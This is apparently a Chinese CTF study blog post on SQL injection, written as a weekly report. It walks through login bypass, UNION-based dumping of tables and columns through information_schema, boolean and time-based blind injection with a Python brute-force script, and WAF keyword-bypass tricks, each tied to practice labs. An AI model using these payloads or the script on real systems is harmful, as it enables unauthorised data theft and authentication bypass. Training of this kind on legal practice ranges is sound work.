      <![CDATA[<p>这一周基本都泡在 SQL 注入里：从最基础的登录绕过，到数字型注入用 UNION 拖库，再到关键词被 WAF 全删之后怎么绕，最后用布尔盲注一位一位把 flag 猜出来。这篇周报按「原理 → 题目 → 绕过 → 盲注」的顺序整理一遍，方便自己以后回看，也欢迎大佬指正。</p><h2 id="一、SQL-核心原理"><a href="#一、SQL-核心原理" class="headerlink" title="一、SQL 核心原理"></a>一、SQL 核心原理</h2><p>SQL 注入是一种将恶意 SQL 代码插入用户输入并由数据库执行的攻击方式，可导致数据泄露、权限提升甚至删除数据库等严重后果。常见场景包括登录框、搜索框、URL 参数等，核心防御手段是使用参数化查询与严格输入验证。</p><p><strong>SQL 注入的本质：用户输入的数据，被当作 SQL 语句的一部分执行。</strong></p><p>一个例子：一个登录页面，后台 SQL 语句如下（简化版）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span> <span class="keyword">and</span> password<span class="operator">=</span><span class="string">&#x27;用户输入&#x27;</span>;</span><br></pre></td></tr></table></figure><p>正常情况下，我们可以通过输入账号与密码登入，但如果用户利用 sql 漏洞恶意输入 <code>&#39; or 1=1-- </code>，则后台变为：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> <span class="operator">*</span> <span class="keyword">from</span> <span class="keyword">user</span> <span class="keyword">where</span> username<span class="operator">=</span><span class="string">&#x27;&#x27;</span> <span class="keyword">or</span> <span class="number">1</span><span class="operator">=</span><span class="number">1</span><span class="comment">--&#x27; and password=&#x27;随便输入&#x27;;</span></span><br></pre></td></tr></table></figure><p>用户就能在不知道密码的情况下登录。</p><p>解读：<code>--</code> 是 SQL 的注释符号，后面的内容会被注释掉，此时 SQL 语句等价于 <code>select * from user where username=&#39;&#39; or 1=1</code>，而 <code>1=1</code> 永远为真，所以会查询出所有用户信息，实现「免密码登录」—— 这就是最基础的 SQL 注入。</p><h2 id="二、SQL-注入的危害"><a href="#二、SQL-注入的危害" class="headerlink" title="二、SQL 注入的危害"></a>二、SQL 注入的危害</h2><ul><li>数据泄露：获取用户信息、密码、订单等敏感数据。</li><li>权限提升：读到后台账号、用 <code>into outfile</code> 写文件，进一步执行系统命令拿下服务器。</li><li>数据篡改：<code>update</code>、<code>delete</code> 被打进去，整张表甚至整个库都可能被清掉。</li><li>绕过业务逻辑：登录校验、支付金额、管理员权限判断，都可能被一句 <code>or 1=1</code> 直接跳过。</li></ul><h2 id="三、SQL-常用语法"><a href="#三、SQL-常用语法" class="headerlink" title="三、SQL 常用语法"></a>三、SQL 常用语法</h2><ol><li><p>登录绕过</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; OR 1=1-- -</span></span><br></pre></td></tr></table></figure></li><li><p>获取数据库名</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br></pre></td></tr></table></figure></li><li><p>获取表名</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()),<span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>获取字段</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,(<span class="keyword">select</span> group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;你获得的表名&#x27;</span>),<span class="number">3</span></span><br></pre></td></tr></table></figure></li><li><p>获得内容</p> <figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">UNION</span> <span class="keyword">SELECT</span> <span class="number">1</span>,(<span class="keyword">SELECT</span> GROUP_CONCAT(字段) <span class="keyword">FROM</span> 表名),<span class="number">3</span> <span class="comment">-- -</span></span><br></pre></td></tr></table></figure></li></ol><p>当然还有许多其他的语法，这需要我们不断的积累。这里给一张常用的名词表：</p><p><img src="/images/week1/01-schema-tables.png" alt="查库名 &#x2F; 表名 &#x2F; 字段名最常用的三张表"></p><h2 id="四、一些-SQL-注入题目"><a href="#四、一些-SQL-注入题目" class="headerlink" title="四、一些 SQL 注入题目"></a>四、一些 SQL 注入题目</h2><p>我按我认为的难度分了一下级。下面每类题都配了一道<strong>能直接打</strong>的例题，靶场是这四个（都免费）：</p><ul><li><a href="https://www.ctfhub.com/">CTFHub 技能树</a> —— 中文，注册就能打，SQL 注入节点最全</li><li><a href="https://github.com/Audi-1/sqli-labs">sqli-labs</a> —— 本地起 PHP + MySQL，Less-1 ~ Less-65 把各种闭合方式练一遍</li><li><a href="https://portswigger.net/web-security/sql-injection">PortSwigger Web Security Academy</a> —— 英文，每题都有官方讲解，lab 直接在浏览器里打</li><li><a href="https://buuoj.cn/">BUUOJ</a> &#x2F; <a href="https://www.nssctf.cn/">NSSCTF</a> —— 中文赛事真题环境，赛前刷手感用</li></ul><h3 id="1-数字型注入-报错回显-UNION"><a href="#1-数字型注入-报错回显-UNION" class="headerlink" title="1 [数字型注入 + 报错回显 + UNION]"></a>1 [数字型注入 + 报错回显 + UNION]</h3><p><strong>难度：拉玩了</strong></p><p>先输一个空值看看报错，很多时候报错里会直接把后台语句打出来：</p><p><img src="/images/week1/04-query-error.png" alt="id 传空值时，报错里直接打印了后台 SQL"></p><p>第一步：确定列数</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">order</span> <span class="keyword">by</span> 数字</span><br></pre></td></tr></table></figure><p>数字由小到大，当恰好出现错误时：</p><p><img src="/images/week1/05-order-by.png" alt="ORDER BY 4 报 Unknown column &#39;4&#39; in &#39;order clause&#39;"></p><p>此时数字为 4，这说明有 3 列。</p><p>第二步：确定回显位</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p>哪个数字输出则哪里为回显位（可打印数据的位置）：</p><p><img src="/images/week1/06-union-echo.png" alt="union select 1,2,3 三个位置全部回显"></p><p>这里都输出了则全部为回显位。</p><p>第三步：把回显位换成要查的数据，按「库名 → 表名 → 字段名 → 具体数据」一层层往下查：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, database(), <span class="number">3</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(table_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, group_concat(column_name), <span class="number">3</span> <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="keyword">and</span> table_name<span class="operator">=</span><span class="string">&#x27;users&#x27;</span></span><br><span class="line"><span class="number">0</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>, username, email <span class="keyword">from</span> users limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><p>这一题的表里直接放着 flag，把第二个回显位换成 flag 所在字段即可：</p><p><img src="/images/week1/07-union-flag.png" alt="ID &#x3D; 1 | 用户名 &#x3D; flag{...} | 邮箱 &#x3D; 3"></p><h4 id="例题-·-CTFHub「整数型注入」"><a href="#例题-·-CTFHub「整数型注入」" class="headerlink" title="例题 · CTFHub「整数型注入」"></a>例题 · CTFHub「整数型注入」</h4><p><strong>去哪打</strong>：CTFHub 技能树 → Web → SQL 注入 → <strong>整数型注入</strong><br><strong>目标</strong>：把库里的 flag 查出来，提交给平台就通关</p><p>题目就是一个 <code>?id=</code> 的查询框，<code>id</code> 是数字型、不需要引号。先定列数：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">2</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">1</span> <span class="keyword">order</span> <span class="keyword">by</span> <span class="number">3</span></span><br></pre></td></tr></table></figure><p>报错时那个数字就是列数。再用 <code>-1</code> 把原记录顶掉，只让页面显示我们 union 出来的东西（列数按实际题目写）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,database()</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database()</span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,group_concat(column_name) <span class="keyword">from</span> information_schema.columns <span class="keyword">where</span> table_name<span class="operator">=</span><span class="string">&#x27;flag&#x27;</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,flag <span class="keyword">from</span> flag</span><br></pre></td></tr></table></figure><p>表名、列名都要以你 <code>information_schema</code> 里查到的为准，别照抄我这里的 <code>flag</code>。</p><p>同一套流程在 <strong>sqli-labs Less-2</strong>（数字型）和 PortSwigger 的 <code>SQL injection UNION attack, retrieving data from other tables</code> 上都能再练一遍，只是列数不同。</p><h3 id="2-字符型注入：单引号闭合"><a href="#2-字符型注入：单引号闭合" class="headerlink" title="2 [字符型注入：单引号闭合]"></a>2 [字符型注入：单引号闭合]</h3><p><strong>难度：简单</strong></p><p>第一步：先确定后台代码（闭合方式）</p><p><img src="/images/week1/03-login-bypass.png" alt="登录框里输入 admin&#39; -- -，直接回显 Hello admin"></p><p>从回显的完整 SQL 可以确认，注入点是单引号闭合。</p><p>第二步：查询数据</p><p>将命令插入符号 <code>&#39;</code> 与 <code>-- -</code> 中，如：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="string">&#x27; ORDER BY 4 -- -</span></span><br></pre></td></tr></table></figure><p>然后复刻第一类题。</p><h4 id="例题-·-sqli-labs-Less-1"><a href="#例题-·-sqli-labs-Less-1" class="headerlink" title="例题 · sqli-labs Less-1"></a>例题 · sqli-labs Less-1</h4><p><strong>去哪打</strong>：sqli-labs（<a href="https://github.com/Audi-1/sqli-labs">GitHub 仓库</a>，本地用 小皮 &#x2F; phpstudy 起 PHP + MySQL 就能跑）；不想装环境就换 CTFHub 的 <strong>字符型注入</strong><br><strong>目标</strong>：读出 <code>users</code> 表里的数据（CTFHub 那题是读 flag）</p><p>Less-1 的注入点在 <code>?id=</code>，闭合方式是<strong>一个单引号</strong>：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">?id<span class="operator">=</span><span class="number">1</span><span class="string">&#x27; order by 3 --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span> <span class="comment">--+</span></span><br><span class="line">?id<span class="operator">=</span><span class="number">-1</span><span class="string">&#x27; union select 1,2,database() --+</span></span><br><span class="line"><span class="string">?id=-1&#x27;</span> <span class="keyword">union</span> <span class="keyword">select</span> <span class="number">1</span>,<span class="number">2</span>,group_concat(table_name) <span class="keyword">from</span> information_schema.tables <span class="keyword">where</span> table_schema<span class="operator">=</span>database() <span class="comment">--+</span></span><br></pre></td></tr></table></figure><p><code>--+</code> 就是注释符 <code>--</code> 后面那个空格：URL 里 <code>+</code> 会被解码成空格，所以 <code>--+</code> 和 <code>-- -</code> 效果一样。这个靶场每关的列数不同，<code>order by</code> 报错时那个数字就是答案。</p><p>练到 Less-3、Less-4 你会发现闭合方式变成 <code>&#39;)</code> 和 <code>&quot;)</code> —— 所以第一步永远是<strong>试闭合</strong>，不是背 payload。</p><h3 id="3-布尔盲注-时间盲注"><a href="#3-布尔盲注-时间盲注" class="headerlink" title="3 [布尔盲注 &amp; 时间盲注]"></a>3 [布尔盲注 &amp; 时间盲注]</h3><p><strong>难度：有耐心就行</strong></p><p>没有回显、没有报错，页面只有两种结果：</p><ul><li>登录成功</li><li>用户名或密码错误</li></ul><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#x27; AND 1=1 -- -</span><br><span class="line">→ 登录成功        （True）</span><br><span class="line">username: admin&#x27; AND 1=2 -- -</span><br><span class="line">→ 用户名或密码错误 （False）</span><br></pre></td></tr></table></figure><p>有了这个“真假信号”，就可以一个字符一个字符地问：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">admin&#x27; AND (SELECT LENGTH(database()))=10 -- -           → true</span><br><span class="line">admin&#x27; AND ASCII(SUBSTR((SELECT database()),1,1))&gt;100 -- -  → true/false</span><br><span class="line">admin&#x27; AND ASCII(SUBSTR((SELECT database()),1,1))=115 -- -  → true (&#x27;s&#x27;)</span><br></pre></td></tr></table></figure><p>底层就是二分查找：字符的 ASCII 码在 32–126 之间，每次用 <code>&gt; mid</code> 砍一半，7 次左右定位一个字符。</p><h4 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h4><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">username: admin&#x27; AND IF(1=1,SLEEP(1),0) -- -</span><br><span class="line">→ 等约 1 秒</span><br><span class="line">username: admin&#x27; AND IF(1=2,SLEEP(1),0) -- -</span><br><span class="line">→ 立刻返回</span><br></pre></td></tr></table></figure><p>思路：通过脚本一个字母一个字母的拼 flag。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> requests</span><br><span class="line"></span><br><span class="line">url = <span class="string">&quot;http://127.0.0.1:8092/index.php&quot;</span></span><br><span class="line">charset = <span class="string">&quot;abcdefghijklmnopqrstuvwxyz0123456789_&#123;&#125;-&quot;</span></span><br><span class="line">flag = <span class="string">&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">for</span> pos <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">1</span>, <span class="number">60</span>):</span><br><span class="line">    <span class="keyword">for</span> ch <span class="keyword">in</span> charset:</span><br><span class="line">        payload = <span class="string">&quot;0&#x27; or substr((select flag from flag),%d,1)=&#x27;%s&#x27;#&quot;</span> % (pos, ch)</span><br><span class="line">        r = requests.get(url, params=&#123;<span class="string">&quot;id&quot;</span>: payload&#125;, timeout=<span class="number">5</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="string">&quot;Hello&quot;</span> <span class="keyword">in</span> r.text:</span><br><span class="line">            flag += ch</span><br><span class="line">            <span class="built_in">print</span>(flag)</span><br><span class="line">            <span class="keyword">break</span></span><br><span class="line"></span><br><span class="line"><span class="built_in">print</span>(<span class="string">&quot;FLAG:&quot;</span>, flag)</span><br></pre></td></tr></table></figure><p>每命中一位就打印一次，所以能看到 flag 一点一点长出来：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><span class="line">#</span><br><span class="line">f</span><br><span class="line">fl</span><br><span class="line">fla</span><br><span class="line">flag</span><br><span class="line">flag&#123;</span><br><span class="line">flag&#123;b</span><br><span class="line">flag&#123;bl</span><br><span class="line">flag&#123;bl1</span><br><span class="line">flag&#123;bl1n</span><br><span class="line">flag&#123;bl1nd</span><br><span class="line">flag&#123;bl1nd_</span><br><span class="line">flag&#123;bl1nd_1</span><br><span class="line">flag&#123;bl1nd_1s</span><br><span class="line">flag&#123;bl1nd_1s_</span><br><span class="line">flag&#123;bl1nd_1s_p</span><br><span class="line">flag&#123;bl1nd_1s_pa</span><br><span class="line">flag&#123;bl1nd_1s_pat</span><br><span class="line">flag&#123;bl1nd_1s_pat1</span><br><span class="line">flag&#123;bl1nd_1s_pat1e</span><br><span class="line">flag&#123;bl1nd_1s_pat1en</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent</span><br><span class="line">flag&#123;bl1nd_1s_pat1ent&#125;</span><br><span class="line">FLAG: flag&#123;bl1nd_1s_pat1ent&#125;</span><br></pre></td></tr></table></figure><h4 id="例题-·-PortSwigger「Blind-SQL-injection-with-conditional-responses」"><a href="#例题-·-PortSwigger「Blind-SQL-injection-with-conditional-responses」" class="headerlink" title="例题 · PortSwigger「Blind SQL injection with conditional responses」"></a>例题 · PortSwigger「Blind SQL injection with conditional responses」</h4><p><strong>去哪打</strong>：PortSwigger <a href="https://portswigger.net/web-security/all-labs#sql-injection">Web Security Academy 的 SQL 注入 lab 列表</a>，找 <code>Blind SQL injection with conditional responses</code>（免费注册，lab 直接在浏览器里打，做对自动标 solved）<br><strong>目标</strong>：拿到 <code>administrator</code> 的密码并登录进后台</p><p>这题的真实注入点是 <strong><code>TrackingId</code> 这个 cookie</strong>，页面上那句 <code>Welcome back</code> 就是真假信号：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">1</span>    → Welcome back 出现</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND &#x27;</span><span class="number">1</span><span class="string">&#x27;=&#x27;</span><span class="number">2</span>    → Welcome back 消失</span><br></pre></td></tr></table></figure><p>有了信号就能一位一位问密码（先确认长度，再用 <code>&gt;</code> 二分 ASCII）：</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)=&#x27;</span>a</span><br><span class="line">TrackingId<span class="operator">=</span>xyz<span class="string">&#x27; AND (SELECT SUBSTRING(password,1,1) FROM users WHERE username=&#x27;</span>administrator<span class="string">&#x27;)&gt;&#x27;</span>m</span><br></pre></td></tr></table></figure><p>想练时间盲注，打同列表里的 <code>Blind SQL injection with time delays</code>；或者去 sqli-labs 的 <strong>Less-9</strong>，<code>?id=1&#39; and if(1=1,sleep(2),0)--+</code> 能明显看到 2 秒的延迟。</p><h3 id="4-过滤-union-select-空格-注释，绕关键词"><a href="#4-过滤-union-select-空格-注释，绕关键词" class="headerlink" title="4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]"></a>4 [过滤 union&#x2F;select&#x2F;空格&#x2F;注释，绕关键词]</h3><p><strong>难度：夯</strong></p><p><img src="/images/week1/08-waf-rules.png" alt="WAF 规则：删关键词、删空白、删注释"></p><p>我们看到许多关键词都被无效化了，这题可以用这些绕过方法。</p><p><strong>① 关键词双写</strong></p><p><code>union</code> → <code>ununionion</code>：删掉中间的 union 后，剩下 union。</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">union     → ununionion</span><br><span class="line">select    → seselectlect</span><br><span class="line">from      → frfromom</span><br><span class="line">where     → wwherehere</span><br></pre></td></tr></table></figure><p><strong>② <code>/**/</code> 代替空格</strong></p><p>MySQL 里 <code>/**/</code> 是注释，可以用来分隔 token；WAF 只删空白和 <code>--</code> &#x2F; <code>#</code>，不删它。</p><figure class="highlight sql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">0</span><span class="comment">/**/</span>ununionion<span class="comment">/**/</span>seselectlect<span class="comment">/**/</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><p><strong>③ 词中词要特别注意</strong></p><p><code>information_schema</code> 里含 <code>or</code>，会被删成 <code>infmation_schema</code>：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">infoorrmation_schema</span><br></pre></td></tr></table></figure><p>后就可按照这个规则查出 flag。</p><p>但之所以我认为这类题目难，是<strong>它每题规则不同，需要你自己摸索</strong>。</p><h4 id="例题-·-CTFHub-过滤三连：过滤空格-过滤-union-过滤注释"><a href="#例题-·-CTFHub-过滤三连：过滤空格-过滤-union-过滤注释" class="headerlink" title="例题 · CTFHub 过滤三连：过滤空格 &#x2F; 过滤 union &#x2F; 过滤注释"></a>例题 · CTFHub 过滤三连：过滤空格 &#x2F; 过滤 union &#x2F; 过滤注释</h4><p><strong>去哪打</strong>：CTFHub 技能树 → Web → SQL 注入，顺着打<strong>过滤空格 → 过滤 union → 过滤注释</strong>三道<br><strong>目标</strong>：三道都能把 flag 查出来</p><p>这三道正好一一对应上面的三种绕过：</p><figure class="highlight text"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">① 过滤空格   → 用 /**/ 或 %09 顶掉空格</span><br><span class="line">   ?id=1/**/union/**/select/**/database()</span><br><span class="line"></span><br><span class="line">② 过滤 union → 双写，让 WAF 删一次之后还剩下关键词</span><br><span class="line">   ?id=-1&#x27;/**/ununionion/**/seselectlect/**/1,2,3</span><br><span class="line"></span><br><span class="line">③ 过滤注释   → 用不了 -- 和 #，就用 and &#x27;1&#x27;=&#x27;1 把结尾那个引号补齐</span><br><span class="line">   ?id=1&#x27; and &#x27;1&#x27;=&#x27;1</span><br></pre></td></tr></table></figure><p>第三道最容易卡：注释被删掉之后，语句必须在闭合引号后<strong>依然语法完整</strong>——<code>and &#39;1&#39;=&#39;1&#39;</code> 是把结尾那个 <code>&#39;</code> 也吃进字符串里，而不是把它注释掉。</p><p>三题打完，再回头看本题那张 WAF 规则图，基本就能自己出这种题了。</p><hr><p>最后我的报告就差不多结束了，如果有错误，请一定要指出来，我会及时更新。</p>]]>
